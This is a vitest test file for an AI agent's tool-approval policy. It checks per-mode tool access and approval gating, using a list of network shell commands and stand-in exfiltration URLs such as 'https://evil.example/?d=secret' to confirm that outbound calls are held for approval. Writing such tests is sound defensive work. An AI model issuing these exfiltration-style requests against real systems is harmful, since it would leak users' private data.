import { describe, expect, it } from 'vitest';
import { AGENT_MODES } from '../../src/agent/agent-modes.js';
import {
  attachToolPolicy,
  filterToolsForMode,
  getToolPolicy,
  guardToolWithApproval,
  isToolAllowedForMode,
  resetSessionExposure,
  sessionCanLeakPrivateData,
  shellCommandNeedsNetwork,
} from '../../src/agent/tool-policy.js';
import { ApprovalManager } from '../../src/security/approval-manager.js';

const candidateTools = [
  'read',
  'write',
  'edit',
  'bash',
  'shell_command',
  'web_fetch',
  'subagent',
  'browser',
  'notify',
  'remember',
  'soul_get',
  'create_reminder',
  'switch_agent',
  'generate_blog_image',
  'fetch_aeo_visibility',
  'mcp__grep__searchGitHub',
  'mcp__flo-gmail__search_emails',
].map((name) => ({ name }));

describe('mode tool enforcement', () => {
  it('produces stable per-mode tool snapshots', () => {
    const snapshots = Object.fromEntries(
      Object.entries(AGENT_MODES).map(([id, mode]) => [
        id,
        filterToolsForMode(candidateTools, mode).map((tool) => tool.name),
      ])
    );

    expect(snapshots).toEqual({
      general: [
        'read',
        'write',
        'edit',
        'shell_command',
        'web_fetch',
        'subagent',
        'browser',
        'notify',
        'remember',
        'soul_get',
        'create_reminder',
        'switch_agent',
        'generate_blog_image',
        'fetch_aeo_visibility',
        'mcp__flo-gmail__search_emails',
      ],
      coder: [
        'read',
        'write',
        'edit',
        'bash',
        'web_fetch',
        'subagent',
        'switch_agent',
        'mcp__grep__searchGitHub',
      ],
      researcher: [
        'web_fetch',
        'subagent',
        'browser',
        'notify',
        'remember',
        'switch_agent',
        'fetch_aeo_visibility',
        'mcp__flo-gmail__search_emails',
      ],
      writer: ['notify', 'remember', 'soul_get', 'switch_agent', 'generate_blog_image'],
      therapist: ['notify', 'remember', 'soul_get', 'switch_agent'],
    });
  });

  it('does not let the external wildcard unlock internal MCP tools', () => {
    expect(isToolAllowedForMode('mcp__flo-gmail__search_emails', AGENT_MODES.general)).toBe(true);
    expect(isToolAllowedForMode('mcp__pocket-agent__unexpected', AGENT_MODES.general)).toBe(false);
    expect(isToolAllowedForMode('mcp__grep__other', AGENT_MODES.general)).toBe(false);
    expect(isToolAllowedForMode('mcp__flo-gmail__search_emails', AGENT_MODES.writer)).toBe(false);
  });
});

describe('tool capability registry', () => {
  it('lets local work run unattended', () => {
    for (const name of [
      'read', 'write', 'subagent', 'remember', 'notify', 'create_routine', 'task_output', 'task_stop',
      'set_project', 'scaffold_video_project', 'render_video', 'trim_video_silence',
    ]) {
      expect(getToolPolicy(name, 'native').confirmationRequired, name).toBe(false);
    }
    expect(getToolPolicy('unreviewed_tool', 'native')).toMatchObject({ capability: 'unknown', confirmationRequired: true });
    expect(getToolPolicy('generate_blog_image', 'custom')).toMatchObject({
      capability: 'paid-action',
      confirmationRequired: false,
    });
  });

  it('still gates outbound and batch-paid actions', () => {
    for (const name of ['send_telegram_message', 'campaign_send_message', 'campaign_enroll', 'fetch_aeo_visibility', 'browser']) {
      expect(getToolPolicy(name, 'custom').confirmationRequired, name).toBe(true);
    }
  });

  it('allows inspected MCP reads and staging; sends, executes and unreviewed tools require approval', () => {
    const read = [
      'mcp__flo-gmail__gmail_search_emails',
      'mcp__flo-gmail__gmail_get_message',
      'mcp__flo-gmail__gmail_list_pending',
      'mcp__flo-gmail__gmail_propose_send',
      'mcp__flo-calendar__calendar_list_events',
      'mcp__flo-calendar__calendar_check_conflicts',
      'mcp__flo-calendar__calendar_find_best_time',
      'mcp__flo-calendar__calendar_propose_event',
      'mcp__flo-calendar__calendar_block_focus_time',
      'mcp__flo-docs__docs_read_content',
      'mcp__flo-docs__docs_propose_append_text',
      'mcp__flo-docs__drive_search',
      'mcp__flo-docs__drive_list_folder',
      'mcp__flo-bookmarks__bookmarks_list',
      'mcp__flo-ghl__get_contact',
      'mcp__flo-ghl__search_contacts',
      'mcp__ghl-mcp__list_opportunities',
      'mcp__flo-ghl-brett__get_messages',
    ];
    const write = [
      'mcp__firecrawl-mcp__firecrawl_interact',
      'mcp__firecrawl-mcp__firecrawl_monitor_create',
      'mcp__unknown__get_status',
      'mcp__unknown__propose_send',
      'mcp__flo-gmail__gmail_send',
      'mcp__flo-gmail__gmail_execute',
      'mcp__flo-gmail__gmail_delete_by_search',
      'mcp__flo-gmail__gmail_create_label',
      'mcp__flo-gmail__gmail_delete_label',
      'mcp__flo-calendar__calendar_execute',
      'mcp__flo-docs__docs_execute',
      'mcp__flo-bookmarks__bookmarks_delete_folder',
      'mcp__flo-ghl__send_message',
      'mcp__flo-ghl__create_contact',
      'mcp__flo-ghl__add_contact_to_workflow',
      'mcp__flo-ghl__record_invoice_payment',
      'mcp__ghl-mcp__send_campaign_now',
      'mcp__ghl-mcp__getaway',
      'mcp__meta-ads__create_campaign',
    ];
    for (const name of read) {
      expect(getToolPolicy(name, 'mcp'), name).toMatchObject({ capability: 'external-read', confirmationRequired: false });
    }
    for (const name of write) {
      expect(getToolPolicy(name, 'mcp'), name).toMatchObject({ capability: 'external-write', confirmationRequired: true });
    }
  });

  it('only prompts the shell for commands that can leave the machine', async () => {
    const execution = { sessionId: 's', channel: 'scheduled', cwd: '/', approvedRoots: [] };
    ApprovalManager.setNotifier(null);
    const ctx = {} as never;
    for (const name of ['shell_command', 'bash']) {
      const tool = guardToolWithApproval(
        attachToolPolicy({ name, description: '', parameters: {} as never, execute: async () => 'ran' }, 'native'),
        execution
      );
      for (const command of ['ls -la', 'ls | grep curl', 'echo ssh-keygen', 'npm test', 'git status', 'cat ~/notes/curl.md']) {
        expect(await tool.execute({ command }, ctx), `${name}: ${command}`).toBe('ran');
      }
      for (const command of ['curl https://x', 'wget x', 'git push', 'npm publish', 'ls && rsync a h:/b', 'mail -s hi a@b', 'gh pr create', 'aws s3 cp a s3://b']) {
        expect(String(await tool.execute({ command }, ctx)), `${name}: ${command}`).toContain('requires user approval');
      }
      expect(String(await tool.execute({}, ctx))).toContain('requires user approval');
    }
  });

  it('only prompts the browser tool for acting actions', async () => {
    const execution = { sessionId: 's', channel: 'scheduled', cwd: '/', approvedRoots: [] };
    const tool = guardToolWithApproval(
      attachToolPolicy(
        { name: 'browser', description: '', parameters: {} as never, execute: async () => 'ran' },
        'custom'
      ),
      execution
    );
    ApprovalManager.setNotifier(null);
    const ctx = {} as never;
    expect(await tool.execute({ action: 'navigate', url: 'https://x' }, ctx)).toBe('ran');
    expect(await tool.execute({ action: 'extract' }, ctx)).toBe('ran');
    expect(await tool.execute({ action: 'scroll', direction: 'down' }, ctx)).toBe('ran');
    expect(await tool.execute({ action: 'hover', selector: 'a' }, ctx)).toBe('ran');
    expect(String(await tool.execute({ action: 'click', selector: 'a' }, ctx))).toContain('requires user approval');
    expect(String(await tool.execute({ action: 'type', selector: 'input', text: 'x' }, ctx))).toContain('requires user approval');
    expect(String(await tool.execute({ action: 'evaluate', script: '1' }, ctx))).toContain('requires user approval');
  });

  it('treats package installs, fetches and hand-off helpers as network commands', () => {
    for (const command of [
      'npm install', 'npm i left-pad', 'pnpm add x', 'yarn install', 'npx create-thing', 'git pull', 'git fetch origin',
      'git clone https://x', 'pip install requests', 'python3 -m pip install x', 'brew install jq', 'open https://x',
      'launchctl load x.plist', 'crontab -l', 'docker run x', 'cd app && npm ci', 'nslookup x.example',
    ]) {
      expect(shellCommandNeedsNetwork(command), command).toBe(true);
    }
    for (const command of [
      'npm test', 'npm run build', 'git status', 'git commit -m x', 'node script.js', 'python3 report.py',
      'ls -la', 'cat open-issues.md', 'grep -r npm install.md',
    ]) {
      expect(shellCommandNeedsNetwork(command), command).toBe(false);
    }
    expect(shellCommandNeedsNetwork(undefined)).toBe(true);
  });

  it('asks before new URLs once a session has seen untrusted content and private data', async () => {
    ApprovalManager.setNotifier(null);
    resetSessionExposure();
    const ctx = {} as never;
    const make = (name: string, source: 'native' | 'custom' | 'mcp') => {
      const execute = async () => 'ran';
      return (sessionId: string) =>
        guardToolWithApproval(
          attachToolPolicy({ name, description: '', parameters: {} as never, execute }, source),
          { sessionId, channel: 'cron:egress-test', cwd: '/', approvedRoots: [] }
        );
    };
    const webFetch = make('web_fetch', 'native');
    const browser = make('browser', 'custom');
    const readFile = make('read', 'native');
    const gmailRead = make('mcp__flo-gmail__gmail_get_message', 'mcp');

    // Pure research stays unattended, however many pages.
    for (let i = 0; i < 3; i += 1) expect(await webFetch('research').execute({ url: `https://a.example/${i}` }, ctx)).toBe('ran');
    expect(sessionCanLeakPrivateData('research')).toBe(false);

    // Email is both private and untrusted: the next URL needs the owner.
    expect(await gmailRead('inbox').execute({ id: '1' }, ctx)).toBe('ran');
    expect(sessionCanLeakPrivateData('inbox')).toBe(true);
    expect(String(await webFetch('inbox').execute({ url: 'https://evil.example/?d=secret' }, ctx))).toContain('requires user approval');
    expect(String(await browser('inbox').execute({ action: 'navigate', url: 'https://evil.example' }, ctx))).toContain('requires user approval');
    expect(String(await browser('inbox').execute({ action: 'tabs_open', url: 'https://evil.example' }, ctx))).toContain('requires user approval');
    expect(await browser('inbox').execute({ action: 'extract' }, ctx)).toBe('ran');

    // Web page first, then a local file: the following fetch asks.
    expect(await webFetch('mixed').execute({ url: 'https://a.example' }, ctx)).toBe('ran');
    expect(await readFile('mixed').execute({ file_path: 'notes.md' }, ctx)).toBe('ran');
    expect(String(await webFetch('mixed').execute({ url: 'https://a.example/next' }, ctx))).toContain('requires user approval');

    // Sessions are independent.
    expect(await webFetch('fresh').execute({ url: 'https://a.example' }, ctx)).toBe('ran');
    resetSessionExposure();
  });

  it('runs public SEO research unattended and follows the egress rule for page reads', async () => {
    ApprovalManager.setNotifier(null);
    resetSessionExposure();
    const ctx = {} as never;
    const make = (name: string) => (sessionId: string) =>
      guardToolWithApproval(
        attachToolPolicy({ name, description: '', parameters: {} as never, execute: async () => 'ran' }, 'mcp'),
        { sessionId, channel: 'cron:research-test', cwd: '/', approvedRoots: [] }
      );
    const seo = make('mcp__dataforseo-mcp-server__api_request');
    const legacySeo = make('mcp__dataforseo-mcp-server__serp_organic_live_advanced');
    const search = make('mcp__firecrawl-mcp__firecrawl_search');
    const scrape = make('mcp__firecrawl-mcp__firecrawl_scrape');
    const readFile = (sessionId: string) =>
      guardToolWithApproval(
        attachToolPolicy({ name: 'read', description: '', parameters: {} as never, execute: async () => 'ran' }, 'native'),
        { sessionId, channel: 'cron:research-test', cwd: '/', approvedRoots: [] }
      );

    expect(getToolPolicy('mcp__dataforseo-mcp-server__api_request', 'mcp').capability).toBe('web-read');
    // Even from a scheduled run (no one to ask), research goes through.
    expect(await seo('s').execute({ method: 'POST', path: '/v3/serp/google/organic/live/advanced' }, ctx)).toBe('ran');
    expect(await legacySeo('s').execute({ keyword: 'x' }, ctx)).toBe('ran');
    expect(await search('s').execute({ query: 'taekwondo belt order' }, ctx)).toBe('ran');
    expect(await scrape('s').execute({ url: 'https://a.example' }, ctx)).toBe('ran');
    // Only the data API's read methods are unattended.
    expect(String(await seo('s').execute({ method: 'DELETE', path: '/v3/x' }, ctx))).toContain('requires user approval');
    // After private data, a page read is egress and asks like web_fetch.
    expect(await readFile('s').execute({ file_path: 'notes.md' }, ctx)).toBe('ran');
    expect(String(await scrape('s').execute({ url: 'https://evil.example/?d=x' }, ctx))).toContain('requires user approval');
    expect(await search('s').execute({ query: 'still fine' }, ctx)).toBe('ran');
    resetSessionExposure();
  });

  it('lets one "allow web for this chat" click cover later page reads in that desktop chat only', async () => {
    resetSessionExposure();
    ApprovalManager.clearSessionGrants();
    const seen: Array<{ id: string; sessionGrant?: string; toolName: string }> = [];
    let answer: 'approve-session' | 'approve' | 'deny' = 'approve-session';
    ApprovalManager.setNotifier((request) => {
      seen.push(request);
      // A per-chat grant is refused for requests that did not offer one.
      queueMicrotask(() => {
        if (!ApprovalManager.resolve(request.id, answer, 'ui')) ApprovalManager.resolve(request.id, 'deny', 'ui');
      });
      return true;
    });
    const ctx = {} as never;
    const make = (name: string, source: 'native' | 'custom' | 'mcp', sessionId: string) =>
      guardToolWithApproval(
        attachToolPolicy({ name, description: '', parameters: {} as never, execute: async () => 'ran' }, source),
        { sessionId, channel: 'desktop', cwd: '/', approvedRoots: [] }
      );
    await make('read', 'native', 'chat').execute({ file_path: 'a.md' }, ctx);
    await make('web_fetch', 'native', 'chat').execute({ url: 'https://a.example' }, ctx);
    expect(sessionCanLeakPrivateData('chat')).toBe(true);

    expect(await make('web_fetch', 'native', 'chat').execute({ url: 'https://b.example' }, ctx)).toBe('ran');
    expect(seen).toHaveLength(1);
    expect(seen[0].sessionGrant).toBe('web-egress');
    // Later page reads in the same chat do not ask again, across web tools.
    expect(await make('web_fetch', 'native', 'chat').execute({ url: 'https://c.example' }, ctx)).toBe('ran');
    expect(await make('mcp__firecrawl-mcp__firecrawl_scrape', 'mcp', 'chat').execute({ url: 'https://d.example' }, ctx)).toBe('ran');
    expect(seen).toHaveLength(1);

    // The grant never covers a network shell command or a send.
    answer = 'deny';
    expect(String(await make('bash', 'native', 'chat').execute({ command: 'curl https://x.example' }, ctx))).toContain('requires user approval');
    expect(seen.at(-1)?.sessionGrant).toBeUndefined();
    answer = 'approve-session';
    expect(String(await make('mcp__flo-gmail__gmail_send', 'mcp', 'chat').execute({ to: 'a@b.c' }, ctx))).toContain('requires user approval');

    // Other chats still ask.
    await make('read', 'native', 'other').execute({ file_path: 'a.md' }, ctx);
    await make('web_fetch', 'native', 'other').execute({ url: 'https://a.example' }, ctx);
    const before = seen.length;
    answer = 'deny';
    expect(String(await make('web_fetch', 'native', 'other').execute({ url: 'https://b.example' }, ctx))).toContain('requires user approval');
    expect(seen.length).toBe(before + 1);

    ApprovalManager.setNotifier(null);
    ApprovalManager.clearSessionGrants();
    resetSessionExposure();
  });

  it('lets a destructive annotation escalate but never downgrade', () => {
    const annotations = { readOnlyHint: true, destructiveHint: true, idempotentHint: true, openWorldHint: false };
    expect(getToolPolicy('mcp__x__get_thing', 'mcp', annotations)).toEqual({
      capability: 'external-write',
      confirmationRequired: true,
      source: 'mcp',
      annotations,
    });
    expect(getToolPolicy('mcp__x__send_thing', 'mcp', { readOnlyHint: true }).confirmationRequired).toBe(true);
  });
});
